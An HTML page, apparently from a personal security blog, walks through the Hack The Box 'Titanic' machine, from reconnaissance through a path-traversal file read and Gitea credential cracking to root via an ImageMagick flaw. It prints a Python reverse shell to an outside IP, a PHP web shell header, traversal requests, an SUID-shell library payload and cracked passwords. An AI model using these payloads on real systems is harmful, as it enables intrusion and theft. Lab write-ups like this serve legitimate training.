@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Titanic - Hack The Box</title>
+    <link rel="stylesheet" href="/styles.css">
+    <link rel="icon" type="image/x-icon" href="/assets/images/racoon.ico">
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+        }
+
+        body {
+            position: relative;
+            min-height: 100vh;
+        }
+
+        .opaque-bg {
+            background-color: rgba(13, 13, 13, 0.6);
+            position: fixed;
+            top: 50px;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+        }
+
+        .content {
+            position: relative;
+            z-index: 2;
+            min-height: 100vh;
+            padding-bottom: 20px;
+        }
+
+        .content .left-aligned-content {
+            text-align: left !important;
+            max-width: 800px;
+            margin: 0 20px !important;
+            padding: 20px 0 !important;
+        }
+
+        .content .left-aligned-content h1,
+        .content .left-aligned-content h2,
+        .content .left-aligned-content p,
+        .content .left-aligned-content ul,
+        .content .left-aligned-content ol,
+        .content .left-aligned-content li {
+            text-align: left !important;
+        }
+
+        .content .left-aligned-content a {
+            color: #ff9933 !important;
+            text-decoration: underline;
+        }
+
+        .content .left-aligned-content a:hover {
+            color: #ff007a !important;
+            text-shadow: 0 0 5px #ff007a;
+        }
+
+        .content .left-aligned-content img {
+            margin: 20px 0 !important;
+            display: block;
+        }
+
+        @media (max-width: 600px) {
+            .content .left-aligned-content {
+                margin: 0 10px !important;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Nav Bar -->
+    <nav>
+        <ul>
+            <li><a href="/index.html">Home</a></li>
+            <li><a href="/about.html">About</a></li>
+            <li><a href="/projects.html">Projects</a></li>
+            <li><a href="/code.html">Code & Tools</a></li>
+            <li><a href="/ctf.html">Write-ups</a></li>
+            <li><a href="/research.html">Research</a></li>
+        </ul>
+    </nav>
+
+    <!-- Main Content -->
+    <div class="opaque-bg" id="opaqueBg"></div>
+    <div class="content">
+        <div class="left-aligned-content">
+            <h1>Titanic - Hack The Box</h1>
+            <img src="/assets/images/ctf/titanic/cover_titanic.png" alt="Titanic Cover">
+            <h2>1. Box Overview</h2>
+            <p>
+                Titanic is an easy-difficulty Linux machine from Hack The Box, featuring an Apache web server on port 80 hosting a Titanic-themed booking site. A secondary virtual host running a Gitea server is discovered through fuzzing. The goal is to exploit an Arbitrary File Read (LFI) vulnerability to retrieve a Gitea database, crack credentials for SSH access, and escalate privileges using a vulnerable ImageMagick version (CVE-2024-41817) in a cron script. This box teaches web enumeration, LFI exploitation, virtual host discovery, and vulnerability research.
+            </p>
+            <ul>
+                <li><strong>Objective:</strong> Gain user access via SSH and escalate to root to capture both flags.</li>
+                <li><strong>Skills Developed:</strong> Nmap scanning, virtual host enumeration, LFI exploitation, SQLite database analysis, hash cracking, and CVE-2024-41817 exploitation.</li>
+                <li><strong>Platform:</strong> Hack The Box</li>
+            </ul>
+
+            <h2>2. Resources Used</h2>
+            <p>Here are the key resources that guided my approach:</p>
+            <ul>
+                <li>
+                    <strong>Resource:</strong><br>
+                    Title: <a href="https://docs.gitea.io/en-us/database/">Gitea SQLite Database Structure</a><br>
+                    Usage: Helped understand the Gitea database schema to locate user credentials.
+                </li>
+                <li>
+                    <strong>Resource:</strong><br>
+                    Title: <a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8">CVE-2024-41817 PoC</a><br>
+                    Usage: Provided a proof-of-concept exploit for ImageMagick’s arbitrary code execution vulnerability.
+                </li>
+                <li>
+                    <strong>Resource:</strong><br>
+                    Title: <a href="https://gist.github.com/h4rithd/0c5da36a0274904cafb84871cf14e271">Hashcat PBKDF2 Hash Formatter</a><br>
+                    Usage: Python script to format Gitea’s PBKDF2-SHA256 hashes for Hashcat.
+                </li>
+                <li>
+                    <strong>Resource:</strong><br>
+                    Title: <a href="https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/logs-poisoning">Log Poisoning Templates</a><br>
+                    Usage: Provided different examples and places to attempt log poisoning.
+                </li>
+            </ul>
+
+            <h2>3. My Approach to Pwning Titanic</h2>
+            
+
+            <h3>Step 1: Initial Recon with Nmap</h3>
+            <p>
+                I started with an Nmap scan to identify open ports and services on the target (10.10.11.55). The scan revealed SSH (port 22) and an Apache web server (port 80) redirecting to <code>titanic.htb</code>, indicating a Linux host.
+            </p>
+            <p><strong>Command:</strong></p>
+            <pre><code>nmap -sV -sC --open -T4 10.10.11.55</code></pre>
+            <p>
+                <strong>Why:</strong> The <code>-T4</code> flag speeds up the scan, <code>-sV</code> detects service versions, <code>-sC</code> runs default scripts, and <code>--open</code> filters for open ports. The scan showed OpenSSH 8.9p1 and Apache 2.4.52, with a redirect to <code>titanic.htb</code>, suggesting a web-based entry point.
+            </p>
+            <img src="/assets/images/ctf/titanic/nmap.png" alt="Nmap scan results">
+
+            <h3>Step 2: Adding Hostname to /etc/hosts</h3>
+            <p>
+                To resolve <code>titanic.htb</code>, I added it to my <code>/etc/hosts</code> file.
+            </p>
+            <p OperationalError: no such column: name
+><strong>Command:</strong></p>
+            <pre><code>echo "10.10.11.55 titanic.htb" | sudo tee -a /etc/hosts</code></pre>
+            <p>
+                <strong>Why:</strong> This ensures the browser resolves <code>titanic.htb</code> to the target IP, allowing access to the web application.
+            </p>
+            <img src="/assets/images/ctf/titanic/etc_host.png" alt="etchosts">
+
+            <h3>Step 3: Exploring the Titanic Website</h3>
+            <p>
+                Visiting <code>http://titanic.htb</code>, I found a booking page for Titanic trips. The form accepted user input (name, email, phone, date, cabin) and generated a downloadable JSON file with the submitted data. I tested for Server-Side Template Injection (SSTI) with payloads like <code>{{7*7}}</code>, but it failed, suggesting no template rendering.
+            </p>
+            <p><strong>Why:</strong> The booking form was a potential attack vector, but the JSON output indicated a possible file-handling vulnerability.</p>
+            <img src="/assets/images/ctf/titanic/webhomepage.png" alt="Booking page">
+            <img src="/assets/images/ctf/titanic/step3.png" alt="json">
+
+            <h3>Step 4: Intercepting Traffic with Burp Suite</h3>
+            <p>
+                I used Burp Suite to analyze HTTP requests and responses for the booking process. Submitting the form sent a POST request to <code>/book</code>, followed by a GET request to <code>/download?ticket=[filename]</code>, which served the JSON file with user input.
+            </p>
+            <p><strong>Command:</strong></p>
+            <pre><code>POST /book HTTP/1.1
+Host: titanic.htb
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 79
+
+name=TRX&email=trx@titanic.htb&phone=33333333333&date=2025-06-20&cabin=Suite</code></pre>
+            <p>
+                <strong>Why:</strong> Burp Suite revealed the <code>/download</code> endpoint used a <code>ticket</code> parameter to specify the file, hinting at a potential Local File Inclusion (LFI) vulnerability.
+            </p>
+
+            <h3>Step 5: Exploiting LFI via /download</h3>
+            <p>
+                I tested the <code>/download</code> endpoint for LFI by requesting <code>/etc/passwd</code>.
+            </p>
+            <p><strong>Command:</strong></p>
+            <pre><code>GET /download?ticket=/../../../etc/passwd HTTP/1.1
+Host: titanic.htb</code></pre>
+            <p>
+                <strong>Why:</strong> The response returned the contents of <code>/etc/passwd</code>, confirming an Arbitrary File Read vulnerability. This allowed reading sensitive files on the system.
+            </p>
+            <img src="/assets/images/ctf/titanic/LFIviaburp.png" alt="LFI /etc/passwd">
+
+            <h3>Step 6: Attempting Log Poisoning</h3>
+            <p>
+                I attempted to escalate LFI to Remote Code Execution (RCE) by poisoning Apache logs via <code>/proc/self/environ</code> and injecting a command in the User-Agent header. As well as attempting to inject php code into apache2 logs.
+            </p>
+            <p><strong>Command:</strong></p>
+            <pre><code>GET /download?ticket=/../../../../../proc/self/environ&cmd=python+-c+'import+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.208",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' HTTP/1.1
+Host: titanic.htb
+User-Agent: &lt;?php system($_GET['cmd']); ?&gt;</code></pre>
+            <p>
+                <strong>Why:</strong> Log poisoning can sometimes lead to RCE if logs are processed insecurely, but this failed, likely due to restricted access to <code>/var/log/apache2</code>.
+            </p>
+            <p><strong>Attempted /proc poisoning</strong></p>
+            <img src="/assets/images/ctf/titanic/log poison_proc.png" alt="Log poisoning attempt">
+            <p><strong>Attempted /apache2 poisoning</strong></p>
+            <img src="/assets/images/ctf/titanic/logp_achache1.png" alt="Log poisoning attempt">
+            <img src="/assets/images/ctf/titanic/lopPahcapche2.png" alt="Log poisoning attempt">
+
+            <h3>Step 7: Fuzzing for Virtual Hosts</h3>
+            <p>
+                I used Gobuster to enumerate virtual hosts, discovering <code>dev.titanic.htb</code>.
+            </p>
+            <p><strong>Command:</strong></p>
+            <pre><code>gobuster vhost -u http://titanic.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain -r</code></pre>
+            <p>
+                <strong>Why:</strong> Virtual host enumeration can reveal hidden services. The scan found <code>dev.titanic.htb</code> (status 200), indicating a potential secondary application.
+            </p>
+            <img src="/assets/images/ctf/titanic/vhost.png" alt="Gobuster vhost">
+
+            <h3>Step 8: Adding dev.titanic.htb to /etc/hosts</h3>
+            <p>
+                I added <code>dev.titanic.htb</code> to <code>/etc/hosts</code> to access the virtual host.
+            </p>
+            <p><strong>Command:</strong></p>
+            <pre><code>echo "10.10.11.55 dev.titanic.htb" | sudo tee -a /etc/hosts</code></pre>
+            <p>
+                <strong>Why:</strong> This allows the browser to resolve <code>dev.titanic.htb</code> and access the Gitea server.
+            </p>
+
+            <h3>Step 9: Exploring the Gitea Server</h3>
+            <p>
+                Visiting <code>dev.titanic.htb</code> revealed a Gitea server. I registered a dummy account to explore repositories, finding <code>flask-app</code> and <code>docker-config</code>. The <code>flask-app</code> repo confirmed the LFI vulnerability in the <code>/download</code> endpoint, while <code>docker-config</code> contained a <code>docker-compose.yml</code> file with a MySQL password (<code>MySQLP@$$w0rd!</code>) and a Gitea data folder at <code>/home/developer/gitea/data</code>.
+            </p>
+            <p><strong>Why:</strong> Gitea repositories often contain sensitive configuration data, and the <code>docker-config</code> repo revealed a potential path to the Gitea database.
+            </p>
+            <img src="/assets/images/ctf/titanic/dev.titanic.png" alt="Gitea repositories">
+            <img src="/assets/images/ctf/titanic/repo.png" alt="repo">
+            <img src="/assets/images/ctf/titanic/repo w passwrod.png" alt="repo">
+
+            <h3>Step 10: Attempting LFI on Gitea Data Directory</h3>
+            <p>
+                I tried accessing <code>/home/developer/gitea/data/gitea.db</code> via LFI, but it returned a 404, likely due to permissions.
+            </p>
+            <p><strong>Command:</strong></p>
+            <pre><code>curl 'http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea.db'</code></pre>
+            <p>
+                <strong>Why:</strong> The Gitea database could contain credentials, but the initial attempt failed, suggesting a deeper path was needed.
+            </p>
+            <img src="/assets/images/ctf/titanic/lfi failure on db.png" alt="repo">
+
+            <h3>Step 11: Replicating Gitea Locally</h3>
+            <p>
+                To understand Gitea’s data structure, I set up a local Gitea instance using Docker.
+            </p>
+            <p><strong>Command:</strong></p>
+            <pre><code>version: '3'
+services:
+  gitea:
+    image: gitea/gitea
+    container_name: gitea
+    ports:
+      - "127.0.0.1:3000:3000"
+      - "127.0.0.1:2222:22"
+    volumes:
+      - /tmp/data:/data
+    environment:
+      - USER_UID=1000
+      - USER_GID=1000
+    restart: always
+</code></pre>
+            <pre><code>docker-compose up</code></pre>
+            <p>
+                <strong>Why:</strong> Running Gitea locally revealed the database location at <code>/data/gitea/gitea.db</code>, suggesting the remote path was <code>/home/developer/gitea/data/gitea/gitea.db</code>.
+            </p>
+            <img src="/assets/images/ctf/titanic/docker compose.png" alt="Local Gitea setup">
+
+            <h3>Step 12: Downloading the Gitea Database</h3>
+            <p>
+                I used the LFI vulnerability to download the Gitea database.
+            </p>
+            <p><strong>Command:</strong></p>
+            <pre><code>curl 'http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db' -o gitea.db</code></pre>
+            <p>
+                <strong>Why:</strong> The correct path allowed successful retrieval of the SQLite database containing user credentials.
+            </p>
+            <img src="/assets/images/ctf/titanic/curl DB.png" alt="Gitea database download">
+
+            <h3>Step 13: Analyzing the Gitea Database</h3>
+            <p>
+                I opened the database with SQLite and queried the <code>user</code> table to extract credentials.
+            </p>
+            <p><strong>Commands:</strong></p>
+            <pre><code>sqlite3 gitea.db
+.tables
+select * from user;</code></pre>
+            <p>
+                <strong>Why:</strong> The <code>user</code> table contained hashed credentials, including for the <code>developer</code> user: <code>sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=</code>.
+            </p>
+            <img src="/assets/images/ctf/titanic/sqldatabaseuser.png" alt="SQLite user table">
+
+            <h3>Step 14: Formatting Hashes for Hashcat</h3>
+            <p>
+                I used a Python script to format the PBKDF2-SHA256 hashes for Hashcat.
+            </p>
+            <p><strong>Command:</strong></p>
+            <pre><code>python3 hash_formatter.py</code></pre>
+            <p>
+                <strong>Why:</strong> The script from <a href="https://gist.github.com/h4rithd/0c5da36a0274904cafb84871cf14e271">GitHub</a> converted the hash to <code>sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=</code>, suitable for cracking.
+            </p>
+            <img src="/assets/images/ctf/titanic/hashccat format repo.png" alt="Hash formatting">
+
+            <h3>Step 15: Cracking the Developer’s Hash</h3>
+            <p>
+                I used Hashcat to crack the <code>developer</code> user’s hash.
+            </p>
+            <p><strong>Command:</strong></p>
+            <pre><code>hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt</code></pre>
+            <p>
+                <strong>Why:</strong> Hashcat’s <code>-m 10900</code> mode targets PBKDF2-SHA256. The cracked password was <code>25282528</code>, providing SSH access.
+            </p>
+            <img src="/assets/images/ctf/titanic/cracked user hash.png" alt="Hashcat cracking">
+
+            <h3>Step 16: Gaining User Access via SSH</h3>
+            <p>
+                I logged into the system as <code>developer</code> via SSH and found the user flag in <code>/home/developer</code>.
+            </p>
+            <p><strong>Command:</strong></p>
+            <pre><code>ssh developer@titanic.htb</code></pre>
+            <p>
+                <strong>Why:</strong> The cracked password granted SSH access, and the user flag was immediately accessible, completing the first objective.
+            </p>
+            <img src="/assets/images/ctf/titanic/ssh user.png" alt="User flag">
+            <img src="/assets/images/ctf/titanic/userflag.png" alt="User flag">
+
+            <h3>Step 17: Enumerating for Privilege Escalation</h3>
+            <p>
+                I enumerated the system, checking <code>sudo -l</code> (no permissions) and exploring <code>/opt</code>. The <code>/opt/scripts</code> directory contained <code>identify_images.sh</code>, which ran <code>magick identify</code> on <code>.jpg</code> files in <code>/opt/app/static/assets/images</code> every minute, writing to <code>metadata.log</code>.
+            </p>
+            <p><strong>Command:</strong></p>
+            <pre><code>cat /opt/scripts/identify_images.sh</code></pre>
+            <p>
+                <strong>Why:</strong> The script’s periodic execution and writeable directory (<code>/opt/app/static/assets/images</code>) suggested a privilege escalation vector.
+            </p>
+            <img src="/assets/images/ctf/titanic/images_sh.png" alt="image.sh">
+            <img src="/assets/images/ctf/titanic/file update metadata.png" alt="metadata">
+
+            <h3>Step 18: Identifying ImageMagick Vulnerability</h3>
+            <p>
+                I checked the <code>magick</code> version, revealing ImageMagick 7.1.1-35, vulnerable to CVE-2024-41817.
+            </p>
+            <p><strong>Command:</strong></p>
+            <pre><code>magick --version</code></pre>
+            <p>
+                <strong>Why:</strong> A GitHub advisory (<a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8">GHSA-8rxc-922v-phg8</a>) confirmed an arbitrary code execution vulnerability in this version.
+            </p>
+            <img src="/assets/images/ctf/titanic/magrickversion.png" alt="ImageMagick version">
+
+            <h3>Step 19: Exploiting CVE-2024-41817</h3>
+            <p>
+                I crafted a malicious shared library to exploit the vulnerability, leveraging the writeable <code>/opt/app/static/assets/images</code> directory.
+            </p>
+            <p><strong>Command:</strong></p>
+            <pre><code>gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+__attribute__((constructor)) void init() {
+    system("cp /bin/sh /tmp && chmod u+s /tmp/sh");
+    exit(0);
+}
+EOF</code></pre>
+            <p>
+                <strong>Why:</strong> The script copied <code>/bin/sh</code> to <code>/tmp/sh</code> with SUID permissions. The cron job executed the payload, creating an SUID binary.
+            </p>
+            <img src="/assets/images/ctf/titanic/POC to root.png" alt="Exploit compilation">
+
+            <h3>Step 20: Gaining Root Access</h3>
+            <p>
+                After the cron job ran, I executed the SUID binary to gain a root shell and retrieved the root flag from <code>/root</code>.
+            </p>
+            <p><strong>Command:</strong></p>
+            <pre><code>/tmp/sh -p</code></pre>
+            <p>
+                <strong>Why:</strong> The SUID binary ran with root privileges, allowing access to <code>root.txt</code>, completing the challenge.
+            </p>
+            <img src="/assets/images/ctf/titanic/sh in .tmp.png" alt="Root flag">
+            <img src="/assets/images/ctf/titanic/Root flag.png" alt="Root flag">
+
+            <h2>4. Lessons Learned and Tips</h2>
+            <p>Here’s what I took away from Titanic:</p>
+            <ul>
+                <li><strong>Tip 1:</strong> Always enumerate virtual hosts with tools like Gobuster to uncover hidden services like Gitea.</li>
+                <li><strong>Tip 2:</strong> LFI vulnerabilities can be powerful for reading sensitive files; test all user-controlled file inputs.</li>
+                <li><strong>Tip 3:</strong> Log poisoning for RCE requires access to log files; verify permissions before attempting.</li>
+                <li><strong>Key Lesson:</strong> Replicating services like Gitea locally helps understand file structures and identify critical paths for exploitation.</li>
+                <li><strong>Future Goals:</strong> Improve skills in automating LFI enumeration and exploring advanced privilege escalation techniques like cron job exploitation.</li>
+            </ul>
+
+            <h2>5. Conclusion</h2>
+            <p>
+                Titanic was an engaging challenge that honed my skills in web enumeration, LFI exploitation, and privilege escalation. The LFI vulnerability opened the door to the Gitea database, while the ImageMagick exploit demonstrated the impact of outdated software. This box was a great introduction to combining web and system vulnerabilities to achieve full system compromise.
+            </p>
+            <img src="/assets/images/ctf/titanic/completedthumbnail.png" alt="completed">
+
+            <h2>6. Additional Notes</h2>
+            <ul>
+                <li>The <a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8">CVE-2024-41817 advisory</a> was critical for crafting the privilege escalation exploit.</li>
+                <li>Understanding Gitea’s default database structure was key to locating the SQLite database for credential extraction.</li>
+            </ul>
+        </div>
+    </div>
+
+    <script>
+        // Dynamically set the height of opaque-bg to match the document height
+        function setOpaqueBgHeight() {
+            const opaqueBg = document.getElementById('opaqueBg');
+            const docHeight = Math.max(
+                document.body.scrollHeight,
+                document.documentElement.scrollHeight,
+                document.body.offsetHeight,
+                document.documentElement.offsetHeight,
+                document.body.clientHeight,
+                document.documentElement.clientHeight
+            );
+            opaqueBg.style.height = `${docHeight - 50}px`;
+        }
+
+        window.addEventListener('load', setOpaqueBgHeight);
+        window.addEventListener('resize', setOpaqueBgHeight);
+    </script>
+</body>
+</html>
